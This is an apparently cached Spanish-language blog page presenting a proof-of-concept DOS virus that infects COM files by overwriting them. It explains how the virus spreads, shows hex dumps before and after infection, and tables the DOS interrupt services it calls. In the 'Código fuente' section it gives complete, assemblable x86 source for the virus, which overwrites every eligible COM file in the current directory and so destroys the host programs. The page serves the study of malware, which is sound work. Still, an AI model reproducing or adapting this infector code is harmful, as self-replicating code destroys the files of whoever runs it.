@@ -1,0 +1,262 @@
+I"�8<p>Prueba de concepto de virus en la plataforma x86/DOS con estrategia de infección por 
+overwriting (sobrescritura) en archivos COM. El virus infecta archivos en tiempo 
+de ejecución.</p>
+
+<h2 id="método-de-infección">Método de infección</h2>
+<p>El virus simplemente sobrescribe otros archivos COM con el código viral. Es la estrategia
+ más primitiva, pero puede ser muy agresiva y destructiva. Todas las generaciones del 
+virus son idénticas.</p>
+
+<p><img src="/assets/images/poc-virus-x86dos-com-overwriting/infection.png" alt="" width="350" class="aligncenter" /></p>
+
+<p>Generalmente nada se preserva de los archivos huéspedes ya que son destruidos por la sobrescritura. 
+La desinfección consiste en eliminar todos los archivos infectados.</p>
+
+<h2 id="método-de-propagación">Método de propagación</h2>
+<p>La infección se realiza en el momento de ejecución infectando todos los archivos COM en el 
+directorio actual a excepción de aquellos con atributo READ-ONLY, HIDDEN o SYSTEM.</p>
+
+<h2 id="flujo-de-ejecución">Flujo de ejecución</h2>
+<p><img src="/assets/images/poc-virus-x86dos-com-overwriting/flow.png" alt="" width="349" class="aligncenter" /></p>
+
+<h2 id="análisis-estático">Análisis estático</h2>
+<p>Hex dump de un archivo sano de tamaño 80 bytes:</p>
+<pre class="ovf">
+<span class="offsetheader">Offset  00 01 02 03 04 05 06 07  ANSI</span>
+<span class="offsetcol">0x0000</span>  <span class="hexcol">B4 09 BA 39 01 CD 21 90</span>  <span class="textcol">´.º9.Í!.</span>
+<span class="offsetcol">0x0008</span>  <span class="hexcol">90 90 90 90 90 90 90 90</span>  <span class="textcol">........</span>
+<span class="offsetcol">0x0010</span>  <span class="hexcol">90 90 90 90 90 90 90 90</span>  <span class="textcol">........</span>
+<span class="offsetcol">0x0018</span>  <span class="hexcol">90 90 90 90 90 90 90 90</span>  <span class="textcol">........</span>
+<span class="offsetcol">0x0020</span>  <span class="hexcol">90 90 90 90 90 90 90 90</span>  <span class="textcol">........</span>
+<span class="offsetcol">0x0028</span>  <span class="hexcol">90 90 90 90 90 90 90 90</span>  <span class="textcol">........</span>
+<span class="offsetcol">0x0030</span>  <span class="hexcol">90 90 90 90 90 B4 00 CD</span>  <span class="textcol">.....´.Í</span>
+<span class="offsetcol">0x0038</span>  <span class="hexcol">21 54 68 69 73 20 69 73</span>  <span class="textcol">!This is</span>
+<span class="offsetcol">0x0040</span>  <span class="hexcol">20 61 20 68 6F 73 74 20</span>  <span class="textcol"> a host </span>
+<span class="offsetcol">0x0048</span>  <span class="hexcol">66 69 6C 65 21 0D 0A 24</span>  <span class="textcol">file!..$</span>
+</pre>
+
+<p>Hex dump del archivo infectado:</p>
+<pre class="ovf">
+<span class="offsetheader">Offset  00 01 02 03 04 05 06 07  ANSI</span>
+<span class="offsetcol">0x0000</span>  <span class="vhexcol">B4 4E 33 C9 BA 32 01 CD</span>  <span class="vtextcol">´N3Éº2.Í</span>
+<span class="offsetcol">0x0008</span>  <span class="vhexcol">21 73 08 EB 21 B4 4F CD</span>  <span class="vtextcol">!s.ë!´OÍ</span>
+<span class="offsetcol">0x0010</span>  <span class="vhexcol">21 72 1B B4 3D B0 02 BA</span>  <span class="vtextcol">!r.´=°.º</span>
+<span class="offsetcol">0x0018</span>  <span class="vhexcol">9E 00 CD 21 8B D8 B4 40</span>  <span class="vtextcol">ž.Í!‹Ø´@</span>
+<span class="offsetcol">0x0020</span>  <span class="vhexcol">B9 38 00 BA 00 01 CD 21</span>  <span class="vtextcol">¹8.º..Í!</span>
+<span class="offsetcol">0x0028</span>  <span class="vhexcol">B4 3E CD 21 EB DF B4 00</span>  <span class="vtextcol">´&gt;Í!ëß´.</span>
+<span class="offsetcol">0x0030</span>  <span class="vhexcol">CD 21 2A 2E 63 6F 6D 00</span>  <span class="vtextcol">Í!*.com.</span>
+<span class="offsetcol">0x0038</span>  <span class="hexcol">21 54 68 69 73 20 69 73</span>  <span class="textcol">!This is</span>
+<span class="offsetcol">0x0040</span>  <span class="hexcol">20 61 20 68 6F 73 74 20</span>  <span class="textcol"> a host </span>
+<span class="offsetcol">0x0048</span>  <span class="hexcol">66 69 6C 65 21 0D 0A 24</span>  <span class="textcol">file!..$</span>
+</pre>
+<style>
+.offsetheader { color:#000000; line-height:200% }
+.offsetcol { color:#000000 }
+.hexcol { color:#000000 }
+.textcol { color:#000000 }
+.vhexcol, .vtextcol  { color:#ff0000 }
+</style>
+
+<p>El virus sobrescribe desde el offset 0x0000 hasta 0x0037 (56 bytes). Lo único que se 
+conserva del huésped es el código luego del offset 0x0037. Si el huésped fuera menor 
+a 56 bytes no quedaría nada de el.</p>
+
+<h2 id="api-utilizada">API utilizada</h2>
+<p>Se utilizan 6 servicios de la DOS API mediante la interrupción de software 21h.</p>
+<div class="table-responsive">
+<table class="table">
+  <thead class="thead-light">
+    <tr>
+      <th>Servicio</th>
+      <th>AH</th>
+      <th>Parámetros</th>
+      <th>Retorno</th>
+      <th>Versión DOS</th>
+    </tr>
+  </thead>
+  <tr>
+    <td>Terminar programa</td>
+    <td>00h</td>
+    <td class="center">-</td>
+    <td class="center">-</td>
+    <td>1+</td>
+  </tr>
+  <tr>
+    <td>Abrir archivo existente</td>
+    <td>3Dh</td>
+    <td>AL = modos de acceso e intercambio<br />DS:DX -&gt; nombre del archivo (ASCIZ)</td>
+    <td>Éxito: CF = 0, AX = handle del archivo <br />Error: CF = 1, AX = código de error </td>
+    <td>2+</td>
+  </tr>
+  <tr>
+    <td>Cerrar archivo</td>
+    <td>3Eh</td>
+    <td>BX = handle del archivo</td>
+    <td>Éxito: CF = 0, AX destruido <br />Error: CF = 1, AX = código de error</td>
+    <td>2+</td>
+  </tr>
+  <tr>
+    <td>Escribir en archivo <br />o dispositivo</td>
+    <td>40h</td>
+    <td>BX = handle del archivo <br />CX = nro. de bytes <br />DS:DX -&gt; datos a escribir</td>
+    <td>Éxito: CF = 0, AX = nro. de bytes escritos <br />Error: CF = 1, AX = código de error</td>
+    <td>2+</td>
+  </tr>
+  <tr>
+    <td>Buscar el primer archivo <br />coincidente</td>
+    <td>4Eh</td>
+    <td>CX = máscara de atributos de archivo<br />DS:DX -&gt; nombre del archivo (ASCIZ)</td>
+    <td>Éxito: CF = 0, resultado en DTA <br />Error: CF = 1, AX = código de error</td>
+    <td>2+</td>
+  </tr>
+  <tr>
+    <td>Buscar el siguiente archivo <br />coincidente</td>
+    <td>4Fh</td>
+    <td class="center">-</td>
+    <td>Exito: CF = 0, resultado en DTA <br />Error: CF = 1, AX = código de error</td>
+    <td>2+</td>
+  </tr>
+</table>
+</div>
+
+<h2 id="código-fuente">Código fuente</h2>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+</pre></td><td class="code"><pre><span class="c">;###############################################################################</span>
+<span class="c">;# Nombre:        virus://DOS/Trivial.56</span>
+<span class="c">;# Plataforma:    Intel x86</span>
+<span class="c">;# SO:            DOS v2.0+, Win32 (mediante NTVDM)</span>
+<span class="c">;# Lenguaje:      ASM x86-16 (sintaxis Intel)</span>
+<span class="c">;# Herramientas:  TASM v4.1, TLINK v7.1.30</span>
+<span class="c">;# Tipo:          Overwriting, Non-Resident, COM infector</span>
+<span class="c">;# Tamaño:        56 bytes</span>
+<span class="c">;# Propagación:   Acción directa sobre el directorio actual. </span>
+<span class="c">;# Infección:     Sobrescritura de archivos COM (no READ-ONLY/HIDDEN/SYSTEM).</span>
+<span class="c">;# Residente:     No</span>
+<span class="c">;# Stealth:       No</span>
+<span class="c">;# Payload:       No</span>
+<span class="c">;##############################################################################</span>
+                <span class="p">.</span><span class="mi">8086</span>  
+                <span class="p">.</span><span class="n">model</span>  <span class="n">tiny</span>
+
+                <span class="n">assume</span>  <span class="n">cs</span><span class="o">:</span><span class="n">virus</span><span class="p">,</span> <span class="n">ds</span><span class="o">:</span><span class="n">virus</span>
+
+      <span class="n">virus</span>     <span class="n">segment</span> <span class="n">byte</span> <span class="n">public</span> <span class="err">'</span><span class="n">CODE</span><span class="err">'</span>
+
+                <span class="n">org</span>     <span class="mi">100</span><span class="n">h</span>
+
+      <span class="n">start</span><span class="o">:</span>    <span class="k">mov</span>     <span class="n">ah</span><span class="p">,</span> <span class="mi">4</span><span class="n">Eh</span>               <span class="c">; | AH = 4Eh </span>
+                <span class="k">xor</span>     <span class="n">cx</span><span class="p">,</span> <span class="n">cx</span>                <span class="c">; | CX = 0, archivos normales</span>
+                <span class="k">lea</span>     <span class="n">dx</span><span class="p">,</span> <span class="n">search_str</span>        <span class="c">; | DS:DX -&gt; "*.COM"</span>
+                <span class="k">int</span>     <span class="mi">21</span><span class="n">h</span>                   <span class="c">; |_DOS API - Buscar primer archivo</span>
+
+                <span class="k">jnc</span>     <span class="n">infect_file</span>           <span class="c">; archivo encontrado</span>
+                <span class="k">jmp</span>     <span class="n">exit</span>                  <span class="c">; no hay archivo</span>
+
+  <span class="n">find_next</span><span class="o">:</span>    <span class="k">mov</span>     <span class="n">ah</span><span class="p">,</span> <span class="mi">4</span><span class="n">Fh</span>               <span class="c">; | AH = 4Fh  </span>
+                <span class="k">int</span>     <span class="mi">21</span><span class="n">h</span>                   <span class="c">; |_DOS API - Buscar siguiente archivo </span>
+
+                <span class="k">jc</span>      <span class="n">exit</span>                  <span class="c">; no hay archivo</span>
+
+<span class="n">infect_file</span><span class="o">:</span>    <span class="k">mov</span>     <span class="n">ah</span><span class="p">,</span> <span class="mi">3</span><span class="n">Dh</span>               <span class="c">; | AH = 3Dh </span>
+                <span class="k">mov</span>     <span class="n">al</span><span class="p">,</span> <span class="mi">2</span>                 <span class="c">; | AL = 2, lectura y escritura</span>
+                <span class="k">mov</span>     <span class="n">dx</span><span class="p">,</span> <span class="mi">9</span><span class="n">Eh</span>               <span class="c">; | DS:DX -&gt; DTA + 1Eh = 9Eh (FileName)</span>
+                <span class="k">int</span>     <span class="mi">21</span><span class="n">h</span>                   <span class="c">; |_DOS API - Abrir archivo existente</span>
+
+                <span class="k">mov</span>     <span class="n">bx</span><span class="p">,</span> <span class="n">ax</span>                <span class="c">; | BX = handle del archivo </span>
+                <span class="k">mov</span>     <span class="n">ah</span><span class="p">,</span> <span class="mi">40</span><span class="n">h</span>               <span class="c">; | AH = 40h</span>
+                <span class="k">mov</span>     <span class="n">cx</span><span class="p">,</span> <span class="n">virus_size</span>        <span class="c">; | CX = tamaño del virus</span>
+                <span class="k">lea</span>     <span class="n">dx</span><span class="p">,</span> <span class="n">start</span>             <span class="c">; | DS:DX -&gt; inicio del código viral</span>
+                <span class="k">int</span>     <span class="mi">21</span><span class="n">h</span>                   <span class="c">; |_DOS API - Escribir en archivo/dispositivo</span>
+
+                <span class="k">mov</span>     <span class="n">ah</span><span class="p">,</span> <span class="mi">3</span><span class="n">Eh</span>               <span class="c">; | AH = 3Eh </span>
+                <span class="k">int</span>     <span class="mi">21</span><span class="n">h</span>                   <span class="c">; |_DOS API - Cerrar archivo</span>
+
+                <span class="k">jmp</span>     <span class="n">find_next</span>             <span class="c">; buscar siguiente</span>
+
+      <span class="n">exit</span><span class="o">:</span>     <span class="k">mov</span>     <span class="n">ah</span><span class="p">,</span> <span class="mi">00</span><span class="n">h</span>               <span class="c">; | AH = 00h</span>
+                <span class="k">int</span>     <span class="mi">21</span><span class="n">h</span>                   <span class="c">; |_DOS API - Retornar a DOS</span>
+
+  <span class="n">search_str</span>    <span class="kt">db</span>      <span class="s">"*.com"</span><span class="p">,</span> <span class="mi">00</span><span class="n">h</span>          <span class="c">; nombre comodín de búsqueda</span>
+  <span class="n">virus_size</span>    <span class="k">equ</span>     <span class="p">(</span><span class="err">$</span> <span class="o">-</span> <span class="n">start</span><span class="p">)</span>           <span class="c">; tamaño del virus</span>
+
+       <span class="n">virus</span>    <span class="n">ends</span>
+                <span class="n">end</span>     <span class="n">start</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+
+<h2 id="casos-reales">Casos reales</h2>
+<ul>
+  <li>La familia de virus <em>Trivial</em> en sistemas DOS se caracteriza por tener los 
+ejemplares de virus más pequeños. Por ejemplo,<em> DOS/Trivial.22</em> es un 
+virus de solo 22 bytes.</li>
+  <li>El gusano <em>VBS/LoveLetter.A@mm</em> tiene como principal vector de propagación el
+envió masivo de e-mails. Al ejecutarse sobre escribe archivos de extensión 
+<em>.vbs</em>, <em>.vbe</em>, <em>.js</em>, <em>.css</em>, <em>.jpg</em>, 
+<em>.txt</em>, <em>.html</em>, <em>.avi</em>, <em>.mp3</em>, y muchos más. Fue 
+notablemente exitoso en el 2000.</li>
+</ul>
+
+<h2 id="bibliografía">Bibliografía</h2>
+<ol class="bibliography"><li><span id="Szor2005">Szor, P. (2005). <i>The Art of Computer Virus Research and Defense</i> (2nd ed.). Addison-Wesley Professional.</span></li>
+<li><span id="Williams1992">Williams, D. (1992). <i>Programmer’s Technical Reference for MSDOS and the IBM PC</i>.</span></li>
+<li><span id="Phalcon-Skism">Phalcon-Skism. <i>40-Hex</i>.</span></li></ol>
+:ET
